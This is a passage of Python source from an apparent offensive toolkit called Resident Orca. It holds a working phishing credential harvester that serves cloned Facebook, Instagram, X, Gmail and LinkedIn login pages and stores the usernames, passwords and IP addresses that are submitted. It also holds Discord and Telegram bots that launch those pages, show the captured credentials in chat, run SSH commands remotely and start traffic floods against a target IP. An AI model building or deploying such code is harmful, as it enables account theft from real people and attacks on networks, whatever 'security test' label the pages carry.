                cmd.extend(['-Tuning', '2'])
            elif scan_type == "sql":
                cmd.extend(['-Tuning', '4'])
            elif scan_type == "xss":
                cmd.extend(['-Tuning', '5'])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            scan_time = time.time() - start_time
            
            # Parse vulnerabilities
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            # Save to database
            self.db.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, scan_time, success)
                VALUES (?, ?, ?, ?)
            ''', (target, json.dumps(vulnerabilities), scan_time, result.returncode == 0))
            self.db.conn.commit()
            
            return {
                'success': result.returncode == 0,
                'vulnerabilities_found': len(vulnerabilities),
                'vulnerabilities': vulnerabilities[:20],
                'scan_time': scan_time,
                'output_file': output_file
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Phishing and social engineering tools"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_links = {}
        self.phishing_server = None
        self.server_running = False
        self.server_port = 8080
        self.current_link_id = None
        self.current_html = None
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict:
        """Generate phishing link"""
        link_id = str(uuid.uuid4())[:8]
        
        templates = {
            'facebook': self._get_facebook_template(),
            'instagram': self._get_instagram_template(),
            'twitter': self._get_twitter_template(),
            'gmail': self._get_gmail_template(),
            'linkedin': self._get_linkedin_template()
        }
        
        html_content = templates.get(platform, self._get_custom_template())
        
        self.active_links[link_id] = {
            'platform': platform,
            'html': html_content,
            'created': datetime.datetime.now().isoformat()
        }
        
        self.db.cursor.execute('''
            INSERT INTO phishing_links (id, platform, phishing_url, active)
            VALUES (?, ?, ?, 1)
        ''', (link_id, platform, f"http://localhost:{self.server_port if self.server_running else 8080}",))
        self.db.conn.commit()
        
        return {
            'success': True,
            'link_id': link_id,
            'platform': platform,
            'phishing_url': f"http://localhost:{self.server_port}/{link_id}" if self.server_running else f"Use start_server to host"
        }
    
    def start_server(self, link_id: str, port: int = 8080) -> Dict:
        """Start phishing server"""
        if link_id not in self.active_links:
            return {'success': False, 'error': f'Link {link_id} not found'}
        
        if self.server_running:
            self.stop_server()
        
        self.current_link_id = link_id
        self.current_html = self.active_links[link_id]['html']
        self.server_port = port
        
        try:
            server_thread = threading.Thread(target=self._run_server, daemon=True)
            server_thread.start()
            
            # Wait a moment for server to start
            time.sleep(1)
            
            self.server_running = True
            
            local_ip = self._get_local_ip()
            url = f"http://{local_ip}:{port}"
            
            return {
                'success': True,
                'url': url,
                'port': port,
                'link_id': link_id
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _run_server(self):
        """Run HTTP server for phishing"""
        handler_class = self._create_handler()
        with socketserver.TCPServer(("0.0.0.0", self.server_port), handler_class) as httpd:
            httpd.serve_forever()
    
    def _create_handler(self):
        """Create request handler for phishing server"""
        parent = self
        
        class PhishingHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                if self.path == '/' or self.path == f'/{parent.current_link_id}':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(parent.current_html.encode('utf-8'))
                    
                    # Increment click count
                    parent.db.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (parent.current_link_id,))
                    parent.db.conn.commit()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                # Save credentials
                parent.db.cursor.execute('''
                    INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                    VALUES (?, ?, ?, ?, ?)
                ''', (parent.current_link_id, username, password, client_ip, user_agent))
                parent.db.conn.commit()
                
                # Log to console
                print(f"\n{Colors.WARNING}🎣 PHISHING CAPTURE!{Colors.RESET}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
                
                # Redirect
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        return PhishingHandler
    
    def stop_server(self):
        """Stop phishing server"""
        self.server_running = False
        self.current_link_id = None
        self.current_html = None
    
    def get_server_url(self) -> str:
        """Get server URL"""
        if self.server_running:
            return f"http://{self._get_local_ip()}:{self.server_port}"
        return None
    
    def get_active_links(self) -> List[Dict]:
        """Get active phishing links"""
        return [{'link_id': k, **v} for k, v in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        if link_id:
            self.db.cursor.execute('SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC', (link_id,))
        else:
            self.db.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
        return [dict(row) for row in self.db.cursor.fetchall()]
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for phishing link"""
        url = f"http://{self._get_local_ip()}:{self.server_port}" if self.server_running else None
        if not url:
            return None
        
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        if NetworkTools.generate_qr_code(url, qr_filename):
            return qr_filename
        return None
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_facebook_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:20px;width:350px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{text-align:center;margin-bottom:20px}
.logo h1{color:#1877f2;font-size:40px;margin:0}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border-radius:4px;color:#856404;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>facebook</h1></div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_instagram_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{font-family:-apple-system;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px 30px;width:350px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{font-family:'Billabong',cursive;font-size:50px;margin:0}
input{width:100%;padding:9px 8px;margin:8px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px}
button{width:100%;padding:7px 16px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border-radius:4px;color:#856404;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Instagram</h1></div>
<form method="POST">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_twitter_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>X / Twitter</title>
<style>
body{font-family:-apple-system;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{font-size:40px;margin:0}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;font-weight:bold;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;border-radius:8px;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
<form method="POST">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_gmail_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{font-family:'Google Sans',Roboto;background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px 40px;width:400px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1a73e8;font-size:24px;margin:10px 0 0}
h2{font-size:24px;font-weight:400;margin:0 0 10px}
input{width:100%;padding:13px 15px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;font-weight:500;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;border-radius:8px;text-align:center;font-size:13px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Gmail</h1></div>
<h2>Sign in</h2>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_linkedin_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body{font-family:-apple-system;background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px 32px;width:380px}
.logo{text-align:center;margin-bottom:24px}
.logo h1{color:#0a66c2;font-size:32px;margin:0}
h2{font-size:24px;font-weight:600;margin:0 0 8px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;font-weight:600;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;border-radius:4px;color:#856404;text-align:center;font-size:13px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>LinkedIn</h1></div>
<h2>Sign in</h2>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_custom_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#1e3a8a,#001b30);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:10px;padding:40px;width:350px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1e3a8a;font-size:28px;margin:0}
input{width:100%;padding:12px 15px;margin:10px 0;border:1px solid #ddd;border-radius:5px}
button{width:100%;padding:12px;background:linear-gradient(135deg,#1e3a8a,#001b30);color:white;border:none;border-radius:5px;font-weight:600;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border-radius:5px;color:#856404;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Secure Login</h1></div>
<form method="POST">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        config_file = os.path.join(CONFIG_DIR, "discord_config.json")
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return {"enabled": False, "token": "", "prefix": "!"}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = "!") -> bool:
        config = {"token": token, "enabled": enabled, "prefix": prefix}
        with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
            json.dump(config, f, indent=4)
        self.config = config
        return True
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE:
            return False
        
        if not self.config.get('token'):
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents, help_command=None)
            
            @self.bot.event
            async def on_ready():
                print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
                await self.bot.change_presence(activity=discord.Game(name="Resident Orca | !help"))
            
            @self.bot.command(name='help')
            async def help_cmd(ctx):
                embed = discord.Embed(
                    title="🐋 Resident Orca - Cyber Security Command Center",
                    description="**Available Commands**",
                    color=0x1e90ff
                )
                embed.add_field(name="📡 Network", value="`!ping <ip>` `!scan <ip>` `!traceroute <ip>` `!whois <domain>` `!dns <domain>`", inline=False)
                embed.add_field(name="🔐 SSH", value="`!ssh_list` `!ssh_connect <name> <host> <user> <pass>` `!ssh_exec <name> <cmd>` `!ssh_upload/download`", inline=False)
                embed.add_field(name="🚀 Traffic", value="`!traffic_types` `!generate_traffic <type> <ip> <duration>` `!traffic_stop`", inline=False)
                embed.add_field(name="🎣 Phishing", value="`!phishing_facebook` `!phishing_instagram` `!phishing_start <id> <port>` `!phishing_creds`", inline=False)
                embed.add_field(name="🔍 Information", value="`!location <ip>` `!system` `!status` `!threats` `!report`", inline=False)
                embed.add_field(name="🔒 IP Management", value="`!add_ip <ip>` `!block_ip <ip> <reason>` `!list_ips`", inline=False)
                embed.set_footer(text="Resident Orca | Cyber Security Framework")
                await ctx.send(embed=embed)
            
            @self.bot.command(name='ping')
            async def ping_cmd(ctx, target: str):
                await ctx.send(f"🏓 Pinging {target}...")
                result = self.handler.execute(f"ping {target}")
                await ctx.send(f"```{result.get('output', 'No response')[:1900]}```")
            
            @self.bot.command(name='scan')
            async def scan_cmd(ctx, target: str):
                await ctx.send(f"🔍 Scanning {target}...")
                result = self.handler.execute(f"scan {target}")
                await ctx.send(f"```{result.get('output', 'No response')[:1900]}```")
            
            @self.bot.command(name='traceroute')
            async def traceroute_cmd(ctx, target: str):
                await ctx.send(f"🛣️ Tracing route to {target}...")
                result = self.handler.execute(f"traceroute {target}")
                await ctx.send(f"```{result.get('output', 'No response')[:1900]}```")
            
            @self.bot.command(name='whois')
            async def whois_cmd(ctx, domain: str):
                await ctx.send(f"🔎 WHOIS lookup for {domain}...")
                result = self.handler.execute(f"whois {domain}")
                await ctx.send(f"```{result.get('output', 'No response')[:1900]}```")
            
            @self.bot.command(name='dns')
            async def dns_cmd(ctx, domain: str):
                await ctx.send(f"📡 DNS lookup for {domain}...")
                result = self.handler.execute(f"dns {domain}")
                await ctx.send(f"```{result.get('output', 'No response')[:1900]}```")
            
            @self.bot.command(name='location')
            async def location_cmd(ctx, ip: str):
                await ctx.send(f"📍 Getting location for {ip}...")
                result = self.handler.execute(f"location {ip}")
                if result.get('success'):
                    data = result.get('data', {})
                    embed = discord.Embed(title=f"📍 Location: {ip}", color=0x1e90ff)
                    embed.add_field(name="Country", value=data.get('country', 'N/A'), inline=True)
                    embed.add_field(name="City", value=data.get('city', 'N/A'), inline=True)
                    embed.add_field(name="ISP", value=data.get('isp', 'N/A'), inline=True)
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='ssh_list')
            async def ssh_list_cmd(ctx):
                result = self.handler.execute("ssh_list")
                if result.get('success'):
                    connections = result.get('data', {}).get('connections', [])
                    if connections:
                        embed = discord.Embed(title="🔐 SSH Connections", color=0x1e90ff)
                        for conn in connections[:10]:
                            status = "🟢" if conn.get('status') == 'connected' else "🔴"
                            embed.add_field(name=f"{status} {conn.get('name')}", value=f"{conn.get('host')} as {conn.get('username')}", inline=False)
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("No SSH connections configured.")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='ssh_connect')
            async def ssh_connect_cmd(ctx, name: str, host: str, username: str, password: str = None):
                await ctx.send(f"🔐 Connecting to {host} as {username}...")
                cmd = f"ssh_connect {name} {host} {username} {password or ''}"
                result = self.handler.execute(cmd)
                if result.get('success'):
                    await ctx.send(f"✅ SSH connection '{name}' created and connected!")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='ssh_exec')
            async def ssh_exec_cmd(ctx, name: str, *, command: str):
                await ctx.send(f"⚡ Executing on {name}...")
                result = self.handler.execute(f"ssh_execute {name} {command}")
                if result.get('success'):
                    data = result.get('data', {})
                    output = data.get('output', '')[:1500]
                    await ctx.send(f"```{output}```")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='generate_traffic')
            async def traffic_cmd(ctx, traffic_type: str, target_ip: str, duration: int):
                await ctx.send(f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s...")
                result = self.handler.execute(f"generate_traffic {traffic_type} {target_ip} {duration}")
                if result.get('success'):
                    await ctx.send(f"✅ Traffic generation started!")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='traffic_types')
            async def traffic_types_cmd(ctx):
                result = self.handler.execute("traffic_types")
                if result.get('success'):
                    types = result.get('data', {}).get('available_types', [])
                    await ctx.send(f"📡 Available Traffic Types: `{', '.join(types)}`")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='traffic_stop')
            async def traffic_stop_cmd(ctx, generator_id: str = None):
                result = self.handler.execute(f"traffic_stop {generator_id or ''}")
                if result.get('success'):
                    await ctx.send(f"✅ Traffic stopped.")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='phishing_facebook')
            async def phishing_fb_cmd(ctx):
                result = self.handler.execute("generate_phishing_link_for_facebook")
                if result.get('success'):
                    data = result.get('data', {})
                    embed = discord.Embed(title="🎣 Facebook Phishing Link Created", color=0x1e90ff)
                    embed.add_field(name="Link ID", value=data.get('link_id', 'N/A'), inline=True)
                    embed.add_field(name="Platform", value="Facebook", inline=True)
                    embed.add_field(name="Next Step", value=f"Use `!phishing_start_server {data.get('link_id')} 8080`", inline=False)
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='phishing_instagram')
            async def phishing_ig_cmd(ctx):
                result = self.handler.execute("generate_phishing_link_for_instagram")
                if result.get('success'):
                    data = result.get('data', {})
                    await ctx.send(f"✅ Instagram phishing link created! ID: `{data.get('link_id')}`")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='phishing_start_server')
            async def phishing_start_cmd(ctx, link_id: str, port: int = 8080):
                result = self.handler.execute(f"phishing_start_server {link_id} {port}")
                if result.get('success'):
                    data = result.get('data', {})
                    embed = discord.Embed(title="🎣 Phishing Server Started", color=0x1e90ff)
                    embed.add_field(name="URL", value=data.get('url', 'N/A'), inline=False)
                    embed.add_field(name="Port", value=port, inline=True)
                    embed.add_field(name="Link ID", value=link_id, inline=True)
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='phishing_creds')
            async def phishing_creds_cmd(ctx, link_id: str = None):
                result = self.handler.execute(f"phishing_credentials {link_id or ''}")
                if result.get('success'):
                    creds = result.get('data', [])
                    if creds:
                        embed = discord.Embed(title=f"🎣 Captured Credentials ({len(creds)})", color=0xff4444)
                        for cred in creds[:5]:
                            embed.add_field(
                                name=f"📧 {cred.get('username', 'N/A')}",
                                value=f"Password: ||{cred.get('password', 'N/A')}||\nIP: {cred.get('ip_address', 'N/A')}",
                                inline=False
                            )
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("No captured credentials yet.")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='add_ip')
            async def add_ip_cmd(ctx, ip: str):
                result = self.handler.execute(f"add_ip {ip}")
                if result.get('success'):
                    await ctx.send(f"✅ IP {ip} added to monitoring.")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='block_ip')
            async def block_ip_cmd(ctx, ip: str, *, reason: str = "Manually blocked"):
                result = self.handler.execute(f"block_ip {ip} {reason}")
                if result.get('success'):
                    await ctx.send(f"🔒 IP {ip} blocked. Reason: {reason}")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='list_ips')
            async def list_ips_cmd(ctx):
                result = self.handler.execute("list_ips")
                if result.get('success'):
                    ips = result.get('data', {}).get('ips', [])
                    if ips:
                        embed = discord.Embed(title="📋 Managed IPs", color=0x1e90ff)
                        active = [ip for ip in ips if not ip.get('is_blocked')]
                        blocked = [ip for ip in ips if ip.get('is_blocked')]
                        if active:
                            embed.add_field(name=f"🟢 Active ({len(active)})", value="\n".join([f"`{a['ip']}`" for a in active[:10]]), inline=False)
                        if blocked:
                            embed.add_field(name=f"🔴 Blocked ({len(blocked)})", value="\n".join([f"`{b['ip']}`" for b in blocked[:10]]), inline=False)
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("No managed IPs.")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='system')
            async def system_cmd(ctx):
                result = self.handler.execute("system")
                if result.get('success'):
                    data = result.get('data', {})
                    embed = discord.Embed(title="💻 System Information", color=0x1e90ff)
                    embed.add_field(name="OS", value=f"{data.get('system', 'N/A')} {data.get('release', '')}", inline=False)
                    embed.add_field(name="CPU", value=f"{data.get('cpu_percent', 0)}%", inline=True)
                    embed.add_field(name="Memory", value=f"{data.get('memory', {}).get('percent', 0)}%", inline=True)
                    embed.add_field(name="Disk", value=f"{data.get('disk', {}).get('percent', 0)}%", inline=True)
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='status')
            async def status_cmd(ctx):
                result = self.handler.execute("status")
                if result.get('success'):
                    data = result.get('data', {})
                    embed = discord.Embed(title="🐋 Resident Orca Status", color=0x1e90ff)
                    embed.add_field(name="Session", value=data.get('session_id', 'N/A'), inline=True)
                    embed.add_field(name="Total Commands", value=data.get('statistics', {}).get('total_commands', 0), inline=True)
                    embed.add_field(name="Total Threats", value=data.get('statistics', {}).get('total_threats', 0), inline=True)
                    embed.add_field(name="Managed IPs", value=data.get('statistics', {}).get('total_managed_ips', 0), inline=True)
                    embed.add_field(name="Blocked IPs", value=data.get('statistics', {}).get('total_blocked_ips', 0), inline=True)
                    embed.add_field(name="Phishing Links", value=data.get('statistics', {}).get('active_phishing_links', 0), inline=True)
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='threats')
            async def threats_cmd(ctx, limit: int = 5):
                result = self.handler.execute(f"threats {limit}")
                if result.get('success'):
                    threats = result.get('data', [])
                    if threats:
                        embed = discord.Embed(title=f"🚨 Recent Threats ({len(threats)})", color=0xff4444)
                        for threat in threats[:5]:
                            severity_color = "🔴" if threat.get('severity') == 'critical' else "🟡" if threat.get('severity') == 'high' else "🟢"
                            embed.add_field(
                                name=f"{severity_color} {threat.get('threat_type', 'Unknown')}",
                                value=f"Source: `{threat.get('source_ip', 'N/A')}`\nTime: {threat.get('timestamp', '')[:19]}",
                                inline=False
                            )
                        await ctx.send(embed=embed)
                    else:
                        await ctx.send("No recent threats detected.")
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            @self.bot.command(name='report')
            async def report_cmd(ctx):
                await ctx.send("📊 Generating security report...")
                result = self.handler.execute("report")
                if result.get('success'):
                    data = result.get('data', {})
                    embed = discord.Embed(title="📊 Security Report", color=0x1e90ff, timestamp=datetime.datetime.now())
                    stats = data.get('statistics', {})
                    embed.add_field(name="📈 Statistics", value=f"Commands: {stats.get('total_commands', 0)}\nThreats: {stats.get('total_threats', 0)}\nScans: {stats.get('total_nikto_scans', 0)}", inline=True)
                    se = data.get('social_engineering', {})
                    embed.add_field(name="🎣 Phishing Stats", value=f"Links: {se.get('total_phishing_links', 0)}\nCaptured: {se.get('total_captured_credentials', 0)}", inline=True)
                    await ctx.send(embed=embed)
                else:
                    await ctx.send(f"❌ {result.get('output', 'Failed')}")
            
            self.running = True
            await self.bot.start(self.config['token'])
            return True
            
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
            return False
    
    def start_bot_thread(self):
        """Start Discord bot in thread"""
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_bot(self):
        """Run bot in thread"""
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot thread error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        config_file = os.path.join(CONFIG_DIR, "telegram_config.json")
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return {"enabled": False, "api_id": "", "api_hash": "", "bot_token": ""}
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str, enabled: bool = True) -> bool:
        config = {"api_id": api_id, "api_hash": api_hash, "bot_token": bot_token, "enabled": enabled}
        with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
            json.dump(config, f, indent=4)
        self.config = config
        return True
    
    async def start(self):
        """Start Telegram bot"""
        if not TELETHON_AVAILABLE:
            return False
        
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            return False
        
        try:
            self.client = TelegramClient('orca_session', self.config['api_id'], self.config['api_hash'])
            
            @self.client.on(events.NewMessage(pattern='/start'))
            async def start_handler(event):
                await event.reply("🐋 **Resident Orca Active**\n\nUse /help for available commands.")
            
            @self.client.on(events.NewMessage(pattern='/help'))
            async def help_handler(event):
                help_text = """
🐋 **Resident Orca - Commands**

**Network:**
/ping <ip> - Ping target
/scan <ip> - Port scan
/traceroute <ip> - Trace route
/whois <domain> - WHOIS lookup
/location <ip> - IP geolocation

**SSH:**
/ssh_list - List connections
/ssh_connect <name> <host> <user> <pass> - Connect
/ssh_exec <name> <cmd> - Execute command

**Traffic:**
/traffic_types - Available types
/generate_traffic <type> <ip> <duration> - Generate traffic

**Phishing:**
/phish_facebook - Create Facebook link
/phish_instagram - Create Instagram link
/phish_start <id> <port> - Start server
/phish_creds - View captured credentials

**System:**
/system - System info
/status - Bot status
/threats - Recent threats
/report - Security report
"""
                await event.reply(help_text)
            
            @self.client.on(events.NewMessage(pattern='/ping (.*)'))
            async def ping_handler(event):
                target = event.pattern_match.group(1)
                await event.reply(f"🏓 Pinging {target}...")
                result = self.handler.execute(f"ping {target}")
                await event.reply(f"```{result.get('output', 'No response')[:500]}```")
            
            @self.client.on(events.NewMessage(pattern='/scan (.*)'))
            async def scan_handler(event):
                target = event.pattern_match.group(1)
                await event.reply(f"🔍 Scanning {target}...")
                result = self.handler.execute(f"scan {target}")
                await event.reply(f"```{result.get('output', 'No response')[:500]}```")
            
            @self.client.on(events.NewMessage(pattern='/system'))
            async def system_handler(event):
                result = self.handler.execute("system")
                if result.get('success'):
                    data = result.get('data', {})
                    await event.reply(f"💻 **System Info**\nCPU: {data.get('cpu_percent', 0)}%\nMemory: {data.get('memory', {}).get('percent', 0)}%\nDisk: {data.get('disk', {}).get('percent', 0)}%")
                else:
                    await event.reply(f"❌ {result.get('output', 'Failed')}")
            
            @self.client.on(events.NewMessage(pattern='/status'))
            async def status_handler(event):
                result = self.handler.execute("status")
                if result.get('success'):
                    data = result.get('data', {})
                    stats = data.get('statistics', {})
                    await event.reply(f"🐋 **Resident Orca Status**\nCommands: {stats.get('total_commands', 0)}\nThreats: {stats.get('total_threats', 0)}\nManaged IPs: {stats.get('total_managed_ips', 0)}")
                else:
                    await event.reply(f"❌ {result.get('output', 'Failed')}")
            
            @self.client.on(events.NewMessage(pattern='/phish_facebook'))
            async def phish_fb_handler(event):
                result = self.handler.execute("generate_phishing_link_for_facebook")
                if result.get('success'):
                    data = result.get('data', {})
                    await event.reply(f"✅ Facebook phishing link created!\nID: `{data.get('link_id')}`\nUse /phish_start {data.get('link_id')} 8080 to host")
                else:
                    await event.reply(f"❌ {result.get('output', 'Failed')}")
            
            @self.client.on(events.NewMessage(pattern='/phish_start (\\w+) (\\d+)'))
            async def phish_start_handler(event):
                link_id = event.pattern_match.group(1)
                port = int(event.pattern_match.group(2))
                result = self.handler.execute(f"phishing_start_server {link_id} {port}")
